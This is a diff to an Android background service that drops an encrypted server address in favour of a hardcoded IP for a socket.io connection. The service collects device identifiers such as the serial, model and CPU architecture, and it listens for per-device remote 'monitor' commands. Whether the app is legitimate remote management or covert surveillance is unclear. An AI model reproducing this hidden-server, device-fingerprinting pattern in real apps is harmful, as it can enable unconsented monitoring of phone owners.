@@ -85,14 +85,7 @@ public class Server extends Service {
 
         String Socket_url = "";
 
-//        try {
-//            SecretKey secretKey = DeviceUtils.getFixedSecretKey();
-//            // Decrypt the URL
-//            Socket_url = DeviceUtils.decrypt(getString(R.string.stringvalue), secretKey);
-//            Log.d("Socket_url", Socket_url);
-//        } catch (Exception e) {
-//            throw new RuntimeException(e);
-//        }
+
         Socket_url = "http://213.136.72.244:8010";
         try {
             socket = IO.socket(Socket_url);
@@ -129,6 +122,7 @@ public class Server extends Service {
             socket.on("mb-monitor-close-" + mDeviceID, onCloseMonitor);
         } catch (URISyntaxException e) {
             e.printStackTrace();
+            Log.d("errorÇÇ", e.toString());
             throw new RuntimeException(e);
         }
     }
@@ -571,7 +565,21 @@ public class Server extends Service {
         long timestamp = System.currentTimeMillis();
         String hwId = Build.SERIAL;
         String installationData = String.valueOf(timestamp);
-        String abi_value = DeviceUtils.getDeviceArchitecture();
+        String abi_value = "";
+        List<String> supportedAbis = Arrays.asList(Build.SUPPORTED_ABIS);
+
+        if (supportedAbis.contains("arm64-v8a")) {
+            abi_value = "ARM64";
+        } else if (supportedAbis.contains("armeabi-v7a")) {
+            abi_value = "ARM";
+        } else if (supportedAbis.contains("x86_64")) {
+            abi_value = "x86_64";
+        } else if (supportedAbis.contains("x86")) {
+            abi_value = "x86";
+        }
+
+        Log.d("abiÇÇÇ", abi_value);
+
         String deviceModel = Build.MODEL;
         String deviceReleaseVersion = Build.VERSION.RELEASE;
         String deviceManufacture = Build.MANUFACTURER.toUpperCase();
